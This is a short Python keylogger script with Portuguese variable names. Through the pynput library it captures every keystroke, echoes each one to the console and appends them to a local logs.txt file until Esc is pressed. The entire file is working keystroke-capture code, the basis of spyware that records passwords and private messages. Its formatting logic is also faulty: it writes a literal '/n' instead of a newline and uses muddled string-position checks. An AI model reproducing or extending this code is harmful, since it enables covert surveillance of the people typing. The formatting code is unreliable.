import pynput
from pynput.keyboard import Key, Listener

contador_letras = 0
teclas_pressionadas = []

def on_press(tecla):
    global contador_letras, teclas_pressionadas
    teclas_pressionadas.append(tecla)
    contador_letras += 1
    print(f'{tecla} pressionado')
    if contador_letras >= 1:
        contador_letras = 0
        write_file(teclas_pressionadas)
        teclas_pressionadas = []

def write_file(lista_teclas):
    with open("logs.txt", "a") as f:
        for tecla in lista_teclas:
            ke = str(tecla).replace(" ' ", "")
            if (ke.find("Key.spac") > 0) and (ke.find("Key.spac") <= 7):
                f.write('/n')
            elif (ke.find("space") > 7):
                f.write('/backspace')
                
            if ke.find("enter") > 0:
                f.write('\n')
            if ke.find("Key") == -1:
                f.write(ke)
            
def on_release(tecla):
    if tecla == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()